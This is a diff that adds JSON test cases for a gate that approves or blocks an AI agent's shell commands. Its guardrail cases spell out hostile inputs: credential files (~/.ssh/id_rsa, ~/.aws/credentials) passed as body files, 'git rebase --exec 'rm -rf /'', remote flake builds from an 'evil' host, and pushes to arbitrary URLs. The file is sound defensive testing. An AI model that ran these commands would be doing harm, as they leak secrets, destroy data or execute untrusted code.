+      "tool_name": "Bash",
+      "tool_input": { "command": "bgcheck flake-check" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_bgcheck_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bgcheck" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_git_diff_no_ext_diff_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git diff --no-ext-diff" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_list_json_jq_length_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd list --json | jq length" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_guard_gh_pr_create_non_draft_reject",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "gh pr create --title t --body b" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "reject",
+    "notes": "pg2-cjfpy.2 guardrail: Operator ruling 2026-07-30 (pg2-4yy4r item 2 / pg2-25oru): gh pr create without --draft is rejected; --draft is the instructed form."
+  },
+  {
+    "case": "plugin_guard_git_push_plus_refspec_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git push origin +main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: pg2-bohpm: a +refspec is a force push in disguise; R6 approves only ordinary pushes."
+  },
+  {
+    "case": "plugin_guard_git_push_delete_refspec_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git push origin :main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: pg2-bohpm: a :ref refspec deletes a remote ref."
+  },
+  {
+    "case": "plugin_guard_git_push_url_remote_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git push https://example.invalid/r.git main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: pg2-abb65: pushing to a URL/path remote would send repository contents to an arbitrary host; only a configured remote NAME is approvable."
+  },
+  {
+    "case": "plugin_guard_git_push_lease_with_value_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git push --force-with-lease=main:abc origin main"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: pg2-bohpm: a cross-branch lease is not the plain --force-with-lease R6 approves."
+  },
+  {
+    "case": "plugin_guard_git_push_fu_bundle_reject",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git push -fu origin feature" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "reject",
+    "notes": "pg2-cjfpy.2 guardrail: R6: plain force is rejected even when bundled with -u."
+  },
+  {
+    "case": "plugin_guard_git_c_core_pager_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -c core.pager=less log" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: Only the closed inert git -c pairs are approvable; core.pager names a program."
+  },
+  {
+    "case": "plugin_guard_git_c_alias_injection_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -c alias.ci=commit ci" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: Alias injection via git -c."
+  },
+  {
+    "case": "plugin_guard_pg_ccaudit_ingest_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-ccaudit ingest" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: tool-error-waste-review skill: the operator must authorize ingest; not approved."
+  },
+  {
+    "case": "plugin_guard_launchctl_bootout_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "launchctl bootout gui/501/org.nixos.beads-dolt-server"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: Service-lifecycle change (R5): only launchctl's read-only verbs are modeled."
+  },
+  {
+    "case": "plugin_guard_bd_export_output_etc_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd export -o /etc/x" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: bd export -o writes an arbitrary path; modeled as a truncating write."
+  },
+  {
+    "case": "plugin_guard_go_run_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "go run ./cmd/genspecs" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: Operator ruling (Phillip, 2026-09-07, tc-vn5z item 1): go run abstains."
+  },
+  {
+    "case": "plugin_guard_git_checkout_branch_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git checkout main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: R3: the agent does not re-checkout the canonical clone on its own initiative; only the path-restore form (git checkout -- <path>) is modeled."
+  },
+  {
+    "case": "plugin_guard_git_stash_pop_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git stash pop" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: R3: stash push/pop are not modeled (the skills instruct them only after asking the operator)."
+  },
+  {
+    "case": "plugin_guard_handoff_create_secret_body_file_reject",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "handoff-create --attended --session-id s --title t --body-file ~/.ssh/id_rsa"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "reject",
+    "notes": "pg2-cjfpy.2 guardrail: The body file is copied into the bead: a secret path is a modeled read and is refused."
+  },
+  {
+    "case": "plugin_guard_bd_update_secret_body_file_reject",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --body-file ~/.aws/credentials"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "reject",
+    "notes": "pg2-cjfpy.2 guardrail: bd --body-file is a modeled path read; a credential file is refused."
+  },
+  {
+    "case": "plugin_guard_nix_build_remote_flakeref_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "nix build github:evil/x#y" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: nix build is closed to the local flake (. / .#attr); a remote flake ref can fetch arbitrary code."
+  },
+  {
+    "case": "plugin_guard_pn_workspace_push_no_verify_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pn workspace push --no-verify" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: --no-verify skips every repo's pre-push hook: unmodeled, abstains."
+  },
+  {
+    "case": "plugin_guard_ceta_archive_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "claude-extended-tool-approver archive" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: The decision-DB-mutating subcommands are not instructed and not modeled (P5: asks.db writes are never approved)."
+  },
+  {
+    "case": "plugin_guard_rg_pre_program_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "rg --pre /tmp/evil.sh foo" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: rg --pre runs a program over every file: unmodeled."
+  },
+  {
+    "case": "plugin_guard_git_rebase_exec_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git rebase --exec 'rm -rf /' main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: git rebase --exec runs arbitrary commands: unmodeled."
+  },
+  {
+    "case": "plugin_guard_git_fetch_url_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git fetch https://example.invalid/x.git" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: fetch is approvable only from a configured remote NAME."
+  },
+  {
+    "case": "plugin_guard_gh_pr_merge_not_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "guardrail"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "gh pr merge 123" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "not-approve",
+    "notes": "pg2-cjfpy.2 guardrail: gh pr merge is a human-only verb (integrate-branch PR-3); not modeled."
   }
 ]
